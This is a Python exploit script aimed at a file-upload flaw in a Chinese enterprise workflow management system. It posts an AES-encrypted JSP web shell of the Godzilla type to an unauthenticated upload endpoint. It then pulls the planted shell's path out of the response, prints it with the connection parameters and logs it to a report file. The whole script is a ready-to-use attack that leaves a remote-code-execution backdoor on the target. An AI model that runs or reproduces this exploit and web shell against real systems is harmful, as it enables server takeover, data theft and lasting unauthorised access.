import re

import requests
import time
import buter
import wirtefile

filename = "./reps/时空智友企业流程化管控系统文件上传漏洞-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }

data = '''<%! String xc="3c6e0b8a9c15224a"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }}
%><%try{byte[] data=new byte[Integer.parseInt(request.getHeader("Content-Length"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))<data.length);data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters", data);Object f=((Class)session.getAttribute("payload")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}
%>'''
poc = "/formservice?service=attachment.write&isattach=false&filename=esy.jsp"

def skzyfileup_RCE(url):
    try:
        reps = requests.post(url+ poc,headers=headers, timeout=5, verify=False, data=data)
        text = reps.text.encode("iso-8859-1").decode("utf-8")
        pattern = r"<root>(.*?)<\/root>"
        match = re.search(pattern, text)
        if match:
            extracted_content = match.group(1)
            shell_path = url + "/form/temp/" + extracted_content
            print(buter.colors.GREEN+  f"存在时空智友企业流程化管控系统文件上传漏洞 url : {url}\n请使用gsl_connect pass&key&java_AES_RAW : {shell_path}" + buter.colors.END)
            reptext = f"请使用gsl_connect pass&key&java_AES_RAW : {shell_path}"
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现时空智友企业流程化管控系统文件上传漏洞 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
